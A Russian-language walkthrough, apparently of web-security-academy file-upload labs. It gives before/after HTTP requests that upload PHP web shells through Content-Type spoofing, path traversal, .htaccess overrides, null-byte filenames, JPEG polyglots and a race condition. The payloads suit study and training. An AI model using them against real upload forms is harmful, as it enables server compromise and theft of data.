@@ -1,0 +1,126 @@
+1. Remote code execution via web shell upload (Apprentice)Здесь фильтров нет, поэтому запрос обычный.До (обычная загрузка картинки):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="avatar.jpg"
+Content-Type: image/jpeg
+
+FF D8 FF E0 ... [бинарные данные картинки] ...
+----------------BOUNDARY--
+После (загрузка веб-шелла):Мы меняем имя файла и тело на PHP-код.HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+Что изменилось: filename="exploit.php", а внутри тела отправляется PHP-код вместо картинки.2. Web shell upload via Content-Type restriction bypass (Apprentice)Сервер проверяет заголовок Content-Type и отклоняет всё, что не является изображением.До (блокируется сервером):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/x-php   <--- Сервер видит это и выдает ошибку
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+После (обход проверки):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg   <--- Подменяем на разрешенный Content-Type
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+Что изменилось: Content-Type изменен с application/x-php на image/jpeg, чтобы обмануть поверхностную проверку сервера.3. Web shell upload via path traversal (Practitioner)Файл загружается, но в папке /avatars/ выполнение скриптов запрещено. Нужно сохранить его на уровень выше (/files/).До (файл сохраняется в /files/avatars/exploit.php, где код не исполняется):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+После (выход из директории через Path Traversal):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+Что изменилось: В поле filename добавлено ..%2f (закодированный слэш ../), заставляющий сервер записать файл на директорию выше (/files/exploit.php), где PHP-скрипты выполняются.4. Web shell upload via extension blacklist bypass (Practitioner)Расширение .php заблокировано черным списком. Загружаем конфигурационный файл .htaccess, чтобы разрешить новое расширение (например, .l33t).До (попытка отправить .php — блокировка):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+После (шаг 1 — загрузка .htaccess):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .l33t
+----------------BOUNDARY--
+Что изменилось: Имя файла заменено на .htaccess, а текст внутри указывает серверу Apache воспринимать файлы с расширением .l33t как исполняемый PHP. (После этого отправляется второй запрос с файлом exploit.l33t).5. Web shell upload via obfuscated file extension (Practitioner)Фильтр ищет расширение .php в конце строки или блокирует его, но его можно обойти обфускацией.До (заблокировано фильтром):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+После (использование Null-byte %00 или двойного расширения):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+Что изменилось: В filename добавлен нуль-символ (%00). Проверка думает, что файл заканчивается на .jpg, но старые версии движков обрезают строку на %00, сохраняя файл как exploit.php.6. Remote code execution via polyglot web shell upload (Practitioner)Сервер проверяет, является ли файл реальной картинкой (анализирует бинарную структуру/магические байты). Обычный текст с тегами PHP не пройдет.До (чистый PHP-скрипт без заголовков картинки — отклоняется):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+----------------BOUNDARY--
+После (полиглот: валидный JPG + встроенный PHP-код):HTTPPOST /avatar.php HTTP/1.1
+Host: 0a8700...web-security-academy.net
+Content-Type: multipart/form-data; boundary=----------------BOUNDARY
+
+----------------BOUNDARY
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+ÿØÿà\x00\x10JFIF... [реальные бинарные байты картинки JPEG] ...<?php echo file_get_contents('/home/carlos/secret'); ?>...
+----------------BOUNDARY--
+Что изменилось: В тело запроса внедрен бинарный код настоящей картинки (начинающийся с сигнатуры ÿØÿà), внутрь которого внедрен PHP-код. Сервер распознает файл как валидный JPEG, сохраняет с расширением .php, а интерпретатор при обращении успешно выполняет код.7. Web shell upload via race condition (Expert)Запрос на загрузку файла отправляется параллельно с запросом на его чтение, чтобы успеть перехватить файл до того, как бэкенд его удалит.До (последовательно — файл успевают удалить):POST /avatar.php (Загрузка) $\rightarrow$ Ответ: 200 OK (файл во временной папке)Пауза / время на проверку сервером $\rightarrow$ Сервер удаляет файл.GET /files/avatars/exploit.php $\rightarrow$ Ответ: 404 Not FoundПосле (параллельная атака одним пакетом в Burp Repeater):Вы выделяете два запроса (загрузка и обращение к файлу) в группу и отправляете их одновременно через Send group in parallel (single packet attack):HTTP--- Пакет 1 (параллельно) ---
+POST /avatar.php (грузим exploit.php)
+
+--- Пакет 2 (параллельно) ---
+GET /files/avatars/exploit.php (сразу запрашиваем его)
+Что изменилось: Запросы летят в один микромомент времени. Один из запросов GET успевает выполниться до того, как скрипт очистки сервера сотрет файл, что позволяет выполнить код и получить секрет.
